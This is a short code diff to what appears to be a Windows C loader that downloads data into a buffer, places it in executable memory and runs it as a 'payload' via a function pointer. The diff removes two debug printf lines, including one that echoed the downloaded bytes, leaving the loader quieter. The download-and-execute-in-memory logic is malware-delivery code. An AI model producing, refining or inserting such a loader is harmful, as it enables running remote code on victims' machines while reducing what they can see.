@@ -102,7 +102,6 @@ int main(void*) {
 				peFile = peTMP;
 				memcpy(peFile + totalSize, pszOutBuffer, dwDownloaded);
 				totalSize += dwDownloaded;
-				printf("%.*s\n", dwDownloaded, pszOutBuffer);
 			}
 
 			free(pszOutBuffer);
@@ -126,7 +125,6 @@ int main(void*) {
 		void (*func)() = (void(*)())execMem;
 		__try {
 			func();
-			printf("Payload executed without crashing.\n");
 		}
 		__except (EXCEPTION_EXECUTE_HANDLER) {
 			printf("Payload caused an exception!\n");
